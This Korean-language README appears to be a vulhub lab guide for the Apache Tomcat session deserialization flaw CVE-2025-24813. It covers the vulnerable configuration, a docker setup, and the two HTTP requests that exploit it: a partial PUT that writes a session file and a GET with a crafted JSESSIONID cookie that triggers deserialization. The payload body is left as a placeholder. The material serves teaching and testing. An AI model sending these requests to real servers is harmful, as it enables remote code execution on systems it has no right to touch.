# Tomcat 세션 역직렬화 원격 코드 실행 (CVE-2025-24813)

[中文版本(Chinese version)](README.zh-cn.md) [English version](README.md)

Apache Tomcat은 Java Servlet, JSP, EL, WebSocket 기술을 구현한 세계적으로 널리 사용되는 오픈소스 웹 애플리케이션 서버입니다.

Apache Tomcat에서는 11.0.0-M1에서 11.0.2까지, 10.1.0-M1에서 10.1.34까지, 9.0.0.M1에서 9.0.98까지 역직렬화 취약점이 발견되었습니다. 이는 Tomcat이 쓰기 가능한 DefaultServlet(읽기 전용=false)과 파일 기반 세션 지속성을 모두 갖춘 상태로 구성될 때 발생합니다. 이 조합을 통해 공격자는 서버에 임의의 파일을 작성하고 JSESSIONID 쿠키를 조작하여 이러한 파일의 역직렬화를 트리거하여 궁극적으로 원격 코드 실행으로 이어질 수 있습니다.

- <https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq>
- <https://github.com/charis3306/CVE-2025-24813>
- <https://forum.butian.net/article/674>

## 환경 구성

다음 명령을 실행하여 취약한 Tomcat 9.0.97 서버를 시작합니다:

```
git clone https://github.com/vulhub/vulhub.git
cd vulhub/tomcat/CVE-2025-24813
docker compose up -d
```

컨테이너 실행 확인

```
docker compose ps
```
![image](https://github.com/user-attachments/assets/cf232c15-9e84-4ae6-8ef5-7c5be5b3b6f2)


서버가 시작된 후, 'http://your-ip:8080'을 방문하여 Tomcat 예제 페이지에 접속할 수 있습니다.

## 취약점 구현 방법

취약점은 Tomcat의 두 가지 주요 잘못된 구성으로 인해 발생합니다. 첫째, DefaultServlet은 readonly=false로 구성되어 파일 업로드가 가능합니다:

```xml
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
        <param-name>debug</param-name>
        <param-value>0</param-value>
    </init-param>
    <init-param>
        <param-name>listings</param-name>
        <param-value>false</param-value>
    </init-param>
    <init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>
```

둘째, Tomcat은 파일 기반 세션 지속성을 사용하도록 구성되어 있습니다.

```xml
<Manager className="org.apache.catalina.session.PersistentManager">
    <Store className="org.apache.catalina.session.FileStore"/>
</Manager>
```

두 구성 모두 동일한 기본 저장 경로를 사용합니다: '$CATALINA_BASE/work/Catalina/localhost/ROOT'.

부분 PUT 요청을 보낼 때 Tomcat은 파일 경로의 경로 구분자(/)를 마침표(.)로 변환하고 파일을 세션 저장 디렉토리에 임시로 저장합니다. 특정 요청을 작성하여 이 디렉토리에 악성 직렬화된 개체를 작성할 수 있습니다.

이 취약점을 악용하려면 먼저 Content-Range 헤더와 함께 부분적인 PUT 요청을 보내 임시 디렉토리에 '.deserialize.session'이라는 파일을 작성하세요(저는 테스트 목적으로 URLDNS 가젯을 사용합니다):

```
PUT /deserialize/session HTTP/1.1
Host: your-ip:8080
Content-Length: 1234
Content-Range: bytes 0-5/10

deserialize content
```

그런 다음 조작된 JSESSIONID 쿠키와 함께 파일의 역직렬화를 트리거하는 또 다른 요청을 보냅니다:

```
GET / HTTP/1.1
Host: your-ip:8080
Cookie: JSESSIONID=.deserialize


```


보시다시피 URLDNS 가젯이 성공적으로 역직렬화되고 DNS 요청이 전송됩니다:


실제 공격 시나리오에서는 "콘텐츠 역직렬화"가 웹 애플리케이션에 의해 역직렬화될 때 임의의 코드를 실행할 수 있는 악의적인 직렬화된 Java 객체로 대체될 것입니다.
